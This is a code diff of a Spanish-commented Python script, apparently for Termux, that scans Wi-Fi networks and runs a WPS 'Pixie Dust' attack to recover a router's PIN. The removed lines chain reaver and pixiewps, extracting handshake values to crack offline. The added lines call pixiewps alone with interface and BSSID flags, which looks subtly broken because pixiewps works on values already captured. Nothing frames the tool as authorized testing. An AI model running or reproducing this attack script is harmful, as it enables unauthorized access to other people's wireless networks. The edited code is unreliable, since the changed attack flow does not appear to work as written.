@@ -1,7 +1,7 @@
 import subprocess
 import json
 import os
-import shutil
+import shutil 
 
 def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y devuelve la salida."""
@@ -28,36 +28,19 @@ def scan_wifi():
         return []
 
 def perform_pixie_dust_attack(bssid):
-    """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
+    """Realiza el ataque Pixie Dust usando pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
 
-    if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
-        print("Información obtenida para Pixie Dust:")
-        print(stdout)
-        print("\nEjecutando pixiewps...\n")
+    # Ejecutar pixiewps directamente
+    pixiewps_command = f"pixiewps -i wlan0 -b {bssid} -vv"
+    pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=True)
 
-        # Extraer los parámetros necesarios
-        pke = extract_value(stdout, "PKE:")
-        pkr = extract_value(stdout, "PKR:")
-        ehash1 = extract_value(stdout, "E-Hash1:")
-        ehash2 = extract_value(stdout, "E-Hash2:")
-        authkey = extract_value(stdout, "AuthKey:")
-
-        # Ejecutar pixiewps con los valores extraídos
-        pixiewps_command = f"pixiewps -e {ehash1} -r {ehash2} -s {pke} -z {pkr} -a {authkey} -vv"
-        pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=False)
-
-        if "WPS pin:" in pixie_stdout:
-            pin = extract_value(pixie_stdout, "WPS pin:")
-            print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
-            return pin
-        else:
-            print("\nPixie Dust no pudo encontrar el PIN.")
-            return None
+    if "WPS pin:" in pixie_stdout:
+        pin = extract_value(pixie_stdout, "WPS pin:")
+        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
+        return pin
     else:
-        print("\nNo se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
-        print(stderr)
+        print("\nPixie Dust no pudo encontrar el PIN.")
         return None
 
 def extract_value(output, key):
@@ -69,7 +52,7 @@ def extract_value(output, key):
 
 def check_prerequisites():
     """Verifica que las herramientas necesarias estén instaladas."""
-    tools = ["termux-wifi-scaninfo", "reaver", "pixiewps"]
+    tools = ["termux-wifi-scaninfo", "pixiewps"]
     for tool in tools:
         if not shutil.which(tool):
             print(f"Error: {tool} no está instalado. Por favor, instálalo e intenta nuevamente.")
